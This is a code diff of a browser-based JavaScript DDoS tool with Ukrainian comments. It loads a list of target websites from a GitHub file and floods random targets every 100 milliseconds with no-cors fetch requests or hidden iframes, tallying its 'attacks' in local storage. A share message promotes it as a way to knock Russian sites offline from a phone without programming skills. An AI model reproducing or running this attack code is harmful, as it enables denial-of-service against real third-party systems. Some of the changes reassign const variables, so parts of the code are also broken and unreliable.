@@ -1,24 +1,34 @@
 // Звідси будуть завантажуватись цілі
 const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json'
+const shareText = `Сайт для **дудосу** з **телефону!**
+Переходь на сайт та вали сайти рф **без програмування** та інших навичок!
+> ${(new URL(window.location.href)).pathname}
+`
 
+const saverInterval = 3000
+const attackInterval = 100
 
 // Функції для керування документом
 
-let frameDiv = $("#frame")
-let attacks = $("#attacks")
+const frameDiv = $("#frame")
+const attacks = $("#attacks")
 
 // Функції рандому
 const add_count = () => attacks.text(parseInt(attacks.text())+1) // Кількість атак
 
 const randint = (num) => Math.floor(Math.random() * num) // Рандомне ціле число
 
-const getRandomArbitrary = (min, max) => Math.random() * (max - min) + min
+function getRandomArbitrary () {
+	const max = 1_000_000;
+	const min = 100_000;
+	return Math.random() * (max - min) + min;
+}
 
 async function getSalt(target) {
 	// Сіль з нашого Криму
 
 	const now = (new Date()).getTime();
-	return target + '?' + now + getRandomArbitrary(100_000, 1_000_000);
+	return target + '?' + now + getRandomArbitrary();
 }
 
 
@@ -30,13 +40,13 @@ async function getTarget() {
 	$("<p>", {id:"load"}).text("Завантажуємо цілі...")
 	.appendTo(box);
 
-    targets = await fetch(targetSource)
+    const targets = await fetch(targetSource)
     .catch((e) => {
     	$("#load").text("Помилка завантаження!");
     	alert(`Помилка!\nПеревірте підключення до інтернету!\nТекст помилки: ${e}`);
     });
     if (targets instanceof Response) { // Якщо запит повернув результат
-    	data = await targets.json();
+    	const data = await targets.json();
 
 		targets = [];
 
@@ -46,9 +56,9 @@ async function getTarget() {
 		        targets.push(data[i])
 		    }
 		};
-		$("#load").remove()
+		$("#load").remove();
 	   	
-	    return targets[randint(targets.length)] // Рандомна ціль
+	    return targets[randint(targets.length)]; // Рандомна ціль
     };
 }
 
@@ -61,15 +71,15 @@ const Frames = {
 			frameborder: 0,
 			width: 1,
 			height: 1
-		}).appendTo(frameDiv);
+		}).appendTo(frameDiv)
 	},
 	clear() {frameDiv.empty()}
 }
 
 
 // Відображення цілі та методу атаки
-let targetField = $("#target")
-let methodField = $("#method")
+const targetField = $("#target")
+const methodField = $("#method")
 
 // https://github.com/BogdanDevUA/simple-ddos/
 
@@ -94,25 +104,27 @@ class Doser {
         // Запуск атаки
 
         btn.text("Стоп");
-        let target = await getTarget();
+        const target = await getTarget();
 
-        let set = setTarget(target);
-        if (set) { // Якщо не завнтажились цілі
+        const set = setTarget(target);
+        if (set) {
+        	// Якщо не завнтажились цілі
+
         	this.attack = false;
         	btn.text("Старт!");
-        	return // Стоп
-        }
+        	return; // Стоп
+        };
         console.log(target);
 
         this.interval = setInterval(isFetch ? async function () {
             // Запити
-            let target = await getTarget();
 
             await fetch([target.page], {
 	            method: target.method,
 	            mode: 'no-cors',
 				referrerPolicy: 'no-referrer'
-	        }).then(() => {
+	        }).catch((e) => {})
+	        .then(() => {
 	            // Після запиту
 
 	            console.log("Ok!");
@@ -120,50 +132,51 @@ class Doser {
 	        })
         } : async function () {
 
-        	let targett = await getSalt(target.page); // Беремо сіль з нашого Криму
+        	const targett = await getSalt(target.page); // Беремо сіль з нашого Криму
 
-        	// Надсилання запиту на сайт за допомогою iframe
+        	// Надсилання запиту на сайт за допомогою елементу iframe
         	await Frames.draw(targett, randint(0, 100_000));
         	console.log(targett);
 
         	add_count();
 
         	if ($("#frame")[0].childElementCount >= 200) {Frames.clear()};
-        }, 	100);
+        }, attackInterval);
 
         this.saver = setInterval(() => {
-        	let atck = LocalStorage.getItem("attacks")
+        	const atck = Database.attacks;
 
-        	atck = !atck ? 0 : parseInt(atck) // Попередні атаки
-        	LocalStorage.setItem("attacks", 
-        	atck + (parseInt(attacks.text())) - atck); // Збереження
+        	atck = !atck ? 0 : parseInt(atck); // Попередні атаки
+        	Database.attacks =
+        	atck + (parseInt(attacks.text()) - atck); // Збереження
 
         	console.log("Saved!");
-        }, 3000)
+        }, saverInterval);
     };
     stop() {
-    	this.attack = false;
-    	clearInterval(this.interval);
-    	clearInterval(this.saver);
-    	Frames.clear()
-    	btn.text("Старт!");
+    	if (this.interval) {
+	    	this.attack = false;
+	    	clearInterval(this.interval);
+	    	clearInterval(this.saver);
+	    	Frames.clear();
+	    	btn.text("Старт!");
+    	}
     };
 }
 
 
 
-let btn = $("#button")
-let LocalStorage = window.localStorage // База данних користувача
-let box = $(".box")
+const btn = $("#button")
+const Database = window.localStorage
+const box = $(".box")
+Doser = new Doser // Ініціалізація воркера
 
 $(() => {
-	Doser = new Doser // Ініціалізація воркера
-
-	if (!LocalStorage.getItem("check_license")) {
+	if (!Database.check_license) {
 		// Ліцензія обов'язкова для прочитання
 
 		alert('Прочитайте ліцензію в розділі "Ресурси"!')
-		LocalStorage.setItem("check_license", true)
+		Database.check_license = true
 	}
 
 	btn.click((e) => {
@@ -171,12 +184,27 @@ $(() => {
 
 		!Doser.attack ? Doser.start() : Doser.stop();
 	});
+
 	$("#attackCount").click(() => {
 		// Загальна кількість атак
 
-		let a = LocalStorage.getItem("attacks")
-		alert(`Взагалом атаковано: ${!a ? 0 : a}`)
+		const a = Database.attacks
+		alert(`Взагалом атаковано: ${!a?0:a}`)
 	});
+
+	// Пасхалки)
+
+	$("#fixed-bugs").click(() => {alert("Я справді пофіксив баги!")})
+
+	$(".uses").click(() => {alert("Цей сайт був написаний 13 річним хакером на JS, HTML, CSS")})
+
+	$("#ua").dblclick(() => {alert("Героям Слава!")})
+
+	$("#container").dblclick(() => {confirm("Норм фон?)")})
+
+	/*
+	$("#share").click(() => {window.open("tg://?text=${shareText}", "_blank")})
+	*/
 })
 
 // Слава Україні!
